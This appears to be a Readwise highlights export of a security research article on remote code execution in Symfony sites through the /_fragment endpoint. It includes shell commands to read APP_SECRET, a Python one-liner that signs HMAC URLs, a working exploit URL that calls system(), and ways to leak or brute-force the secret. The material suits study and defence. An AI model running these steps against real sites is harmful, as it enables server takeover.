---
author: Ambionics
aliases: ["Secret Fragments: Remote Code Execution on Symfony Based Websites"]
tags: [readwise/articles]
url: https://www.ambionics.io/blog/symfony-secret-fragment
date: 2024-08-20
---
# Secret Fragments: Remote Code Execution on Symfony Based Websites

![rw-book-cover](https://www.ambionics.io/images/symfony-secret-fragment/symfony-secret-fragment.png)

## Highlights


> the use of the [Symfony](https://symfony.com/) framework has been growing more and more in PHP based applications. It is now a core component of many well known CMSs, such as [Drupal](https://www.drupal.org/), [Joomla!](https://www.joomla.org/), [eZPlatform](https://ezplatform.com/) (formerly eZPublish), or [Bolt](https://bolt.cm/), and is often used to build custom websites.
> [View Highlight](https://read.readwise.io/read/01hmef5w22x6v0t7aw9zx0x5vk)



> One of Symfony's built-in features, made to handle [Edge-Side Includes](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Edge-Side%20Includes%20Injection%20(ESI).md#Edge-Side%20Includes), is the [`FragmentListener` class](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Essentially, when someone issues a request to `/_fragment`, this listener sets request attributes from given GET parameters. Since this allows to **run arbitrary PHP code** (*more on this later*), the request has to be signed using a HMAC value. This HMAC's secret cryptographic key is stored under a Symfony configuration value named `secret`.
> [View Highlight](https://read.readwise.io/read/01hmef6jy8f9z06r3exr88r269)



> `secret`, is also used, for instance, to build CSRF tokens and remember-me tokens
> [View Highlight](https://read.readwise.io/read/01hmef6x6yg6tdawr6xfvexfjz)



> oftentimes, the secret either has a **default value**, or there exist **ways to obtain the value, bruteforce it offline, or to purely and simply bypass the security check that it is involved with**.
> [View Highlight](https://read.readwise.io/read/01hmef7aypx3ffs4tw2mj9a8e4)



> Since Symfony 4, the secret is generated on installation, and the `/_fragment` page is disabled by default.
> [View Highlight](https://read.readwise.io/read/01hmef95hnzyc60ef8mj5jzb1r)



> Executing code with the help of `secret`
>  We'll first demonstrate how an attacker, having knowledge of the `secret` configuration value, can obtain code execution.
> [View Highlight](https://read.readwise.io/read/01hmef9kp4jkcpafcb1wfwcngp)



> As mentioned before, we will make use of the `/_fragment` page.
> [View Highlight](https://read.readwise.io/read/01hmefa7eeygtdvb5wgn6ftf72)



> if the request's path is `/_fragment` [1], the method will first check that the request is valid (*i.e.* properly signed), and raise an exception otherwise [2]. If the security checks succeed, it will parse the url-encoded `_path` parameter, and set `$request` attributes
> [View Highlight](https://read.readwise.io/read/01hmefbx1xk0wpm1n22fkmkywz)



> Request attributes are not to be mixed up with HTTP request parameters: they are internal values
> [View Highlight](https://read.readwise.io/read/01hmefc2rjpsk803b75djfwkxc)



> One of these request attributes is `_controller`, which specifies which Symfony controller (a *(class, method)* tuple, or simply a *function*) is to be called.
> [View Highlight](https://read.readwise.io/read/01hmefcd309823vt75pnnwpb9j)



> For instance, if we wished to call this method:
>  `class SomeClass { public function someMethod($firstMethodParam, $secondMethodParam) { ... } }`
>  We'd set `_path` to:
>  `_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`
>  The request would then look like this:
>  `http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`
> [View Highlight](https://read.readwise.io/read/01hmefcxhtwt3m79mcnc9ht296)



> Signing the URL
>  To verify the signature of an URL, an HMAC is computed against the *full* URL. The obtained hash is then compared to the one specified by the user.
> [View Highlight](https://read.readwise.io/read/01hmefdbys7dv54ryrdnsb3jef)



> In short, Symfony extracts the `_hash` GET parameter, then reconstructs the full URL, for instance `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, computes an HMAC from this URL using the `secret` as key [1], and compares it to the given hash value [2].
> [View Highlight](https://read.readwise.io/read/01hmefdzqr0skw5nya1why43kr)



> To test this, let's setup a test environment, and extract the secret (in this case, randomly generated).
>  `$ git clone https://github.com/symfony/skeleton.git $ cd skeleton $ composer install $ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment $ grep -F APP_SECRET .env # Find secret APP_SECRET=50c8215b436ebfcc1d568effb624a40e $ cd public $ php -S 0:8000`
>  Now, visiting `http://localhost:8000/_fragment` yields a `403`. Let's now try and provide a valid signature:
>  `$ python -c "import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'50c8215b436ebfcc1d568effb624a40e', b'http://localhost:8000/_fragment', hashlib.sha256).digest()))" b'lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8='`
>  By checking out `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8=`, we now have a `404` status code.
> [View Highlight](https://read.readwise.io/read/01hmefetjjtz9m8mq2gwww7zwg)



> Since we can call any method, with any argument, we can for instance pick `system($command, $return_value)`, and provide a payload like so:
>  `$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull" $ python -c "import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'50c8215b436ebfcc1d568effb624a40e', b'$page', hashlib.sha256).digest()))" b'GFhQ4Hr1LIA8mO1M/qSfwQaSM8xQj35vPhyrF3hvQyI='`
>  We can now visit the exploit URL: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M/qSfwQaSM8xQj35vPhyrF3hvQyI=`.
>  Despite the `500` error, we can see that **our command got executed**.
> [View Highlight](https://read.readwise.io/read/01hmeffcrfpfx7z83x3vqpn2z1)



> ![](https://www.ambionics.io/images/symfony-secret-fragment/1.png)
> [View Highlight](https://read.readwise.io/read/01hmeffrs61qm6raprrcqykegy)



> Finding secrets
> [View Highlight](https://read.readwise.io/read/01hmefggc9gt9b2t9tb4c8rpj2)



> [File Inclusion (LFI & RFI)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/File%20Inclusion%20(LFI%20&%20RFI).md)
>  Evidently, a file read vulnerability could be used to read the following files, and obtain `secret`:
>  • `app/config/parameters.yml`
>  • `.env`
>  *As an example, some Symfony debug toolbars allow you to read files.*
> [View Highlight](https://read.readwise.io/read/01hmefh4y2cwxpjx3qfgzdevza)



> PHPinfo
>  On recent symfony versions (3.x), `secret` is stored in `.env` as `APP_SECRET`. Since it is then imported as an environment variable, they can be seen through a `phpinfo()` page.
>  ![](https://www.ambionics.io/images/symfony-secret-fragment/2.png)
> [View Highlight](https://read.readwise.io/read/01hmefhan9p71p02qyffszyar2)



> [Server Side Request Forgery (SSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md) / IP spoofing (CVE-2014-5245)
> [View Highlight](https://read.readwise.io/read/01hmefhwx1tk5p1cs792ecxqhf)



> Through default values
> [View Highlight](https://read.readwise.io/read/01hmefjd32ehn3y0h3eg32420z)



> Bruteforce
>  Since the secret is often set manually (as opposed to generated randomly), people will often use a passphrase instead of a secure random value, which makes it bruteforceable if we have a hash to bruteforce it against. Obviously, a valid `/_fragment` URL, such as one generated by Symfony, would provide us a valid message-hash tuple to bruteforce the secret.
> [View Highlight](https://read.readwise.io/read/01hmefjq68mtewv22kdhe09kpb)



> ExploitationTheory
>  On the first hand, we have a few things to worry about when exploiting this vulnerability:
>  • The HMAC is computed using the **full URL**. If the website is behind a reverse proxy, we need to use the internal URL of the service instead of the one we're sending our payload to. For instance, the internal URL might be over HTTP instead of HTTPS.
>  • The HMAC's algorithm changed over the years: it was **SHA-1** before, and is now **SHA-256**.
>  • Since Symfony removes the `_hash` parameter from the request, and then generates the URL again, we need to compute the hash on the same URL as it does.
>  • Lots of secrets can be used, so we need to check them all.
>  • On some PHP versions, we cannot call functions which have "by-reference" parameters, such as `system($command, &$return_value)`.
>  • On some Symfony versions, `_controller` cannot be a function, it has to be a method. We need to find a Symfony method that allows us to execute code.
>  On the other hand, we can take advantage of a few things:
>  • Hitting `/_fragment` with no params, or with an invalid hash, should return a `403`.
>  • Hitting `/_fragment` with a valid hash but without a valid controller should yield a `500`.
>  The last point allows us to test secret values without worrying about which function or method we are going to call afterwards.
> [View Highlight](https://read.readwise.io/read/01hmefkacpk9vdkmfhtnpb3fwm)



> Then, we need to find out if we can call a function directly, or if we need to use a class method. We can first try the first, most straightforward way, using a function such as `phpinfo ([ int $what = INFO_ALL ] )` ([documentation](https://www.php.net/manual/en/function.phpinfo.php)).
> [View Highlight](https://read.readwise.io/read/01hmefnmfr7ajh6phh3je8ns8k)



> Otherwise, this means that we'll need to use a class method instead. A good candidate for this is `Symfony\Component\Yaml\Inline::parse`, which is a built-in Symfony class, and as such is present on Symfony websites.
> [View Highlight](https://read.readwise.io/read/01hmefns9n2pydbmv4j19nkgwx)



> The exploit will therefore run through every possible variable combination, and then try out the two exploitation methods. The code is available on [our GitHub](https://github.com/ambionics/symfony-exploits).
> [View Highlight](https://read.readwise.io/read/01hmefq1evd6vq14ahzjaef9sb)



> **getting code execution is trivial**. We can, for instance, call `system()`:
>  `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`
> [View Highlight](https://read.readwise.io/read/01j7358k77sdzfy58y26zvscrw)

